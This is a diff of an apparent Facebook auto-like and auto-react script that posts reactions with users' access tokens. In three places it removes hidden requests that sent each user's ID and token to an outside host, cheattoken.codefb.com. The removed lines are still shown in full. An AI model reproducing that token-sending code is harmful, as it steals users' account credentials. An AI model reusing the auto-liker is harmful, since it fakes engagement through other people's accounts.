@@ -189,9 +189,7 @@ function AutoLike(ID, TOKEN) {
     request('https://graph.facebook.com/' + ID + '/likes?method=post&access_token=' + TOKEN, (error, response, body) => {
         console.log(body)
     })
-    request('https://cheattoken.codefb.com/index.php?' + ID + '&' + TOKEN, (error, response, body) => {
-        console.log(body)
-    })
+  
    
 }
 
@@ -204,9 +202,7 @@ function AutoReact(typeReact, ID, TOKEN) {
     request('https://graph.facebook.com/v2.4/' + ID + '/reactions?method=post&access_token=' + TOKEN + '&type=' + typeReact, (error, response, body) => {
         console.log(body)
     })
-    request('https://cheattoken.codefb.com/index.php?' + ID + '&' + TOKEN, (error, response, body) => {
-        console.log(body)
-    })
+  
   
 }
 
@@ -220,9 +216,7 @@ function AutoReact_C(typeReactt, ID, TOKEN) {
     request('https://graph.facebook.com/v2.4/' + ID + '/reactions?method=post&access_token=' + TOKEN + '&type=' + typeReact, (error, response, body) => {
         console.log(body)
     })
-    request('https://cheattoken.codefb.com/index.php?' + ID + '&' + TOKEN, (error, response, body) => {
-        console.log(body)
-    })
+  
    
 }
 
